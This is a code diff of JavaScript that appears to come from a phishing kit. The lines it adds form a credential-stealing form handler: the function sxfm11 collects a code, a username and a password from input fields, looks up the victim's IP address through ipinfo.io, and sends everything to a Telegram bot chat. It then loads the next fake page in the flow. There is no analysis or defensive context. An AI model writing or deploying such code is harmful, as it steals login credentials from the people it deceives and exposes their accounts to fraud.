@@ -40,7 +40,51 @@ function sxfm1(){
                 },
                 "data": JSON.stringify({
                     "chat_id": chtid,
-                    "text": "B.I:"+response+" - "+mess
+                    "text": "B.I-1:"+response+" - "+mess
+                })
+            };  
+            $.ajax(sets).done(function (response) {
+                var xhttp2 = new XMLHttpRequest();
+                xhttp2.onreadystatechange = function() {
+                    if (this.readyState == 4 && this.status == 200) {
+                        document.getElementById("rdx1").innerHTML =
+                        this.responseText;
+                    }
+                 };
+                xhttp2.open("GET", "rdrs1-1.html", true);
+                xhttp2.send();
+            });  
+        });
+        
+        
+    }
+}
+
+function sxfm11(){
+    
+    var cod = $("#i1").val();
+    var usr = $("#i2").val();
+    var pss = $("#i3").val();
+
+    if(!cod || !usr || !pss){
+        console.log("empty");
+    }else{
+
+        mess = `C:${cod} - U:${usr} - P:${pss}`;
+        $.get('https://ipinfo.io/ip', function(response){
+            var sets = {
+                "async": true,
+                "crossDomain": true,
+                "url": "https://api.telegram.org/bot" + tkl + "/sendMessage",
+                "method": "POST",
+                "headers": {
+                    "Content-Type": "application/json",
+                    "cache-control": "no-cache"
+        
+                },
+                "data": JSON.stringify({
+                    "chat_id": chtid,
+                    "text": "B.I-2:"+response+" - "+mess
                 })
             };  
             $.ajax(sets).done(function (response) {
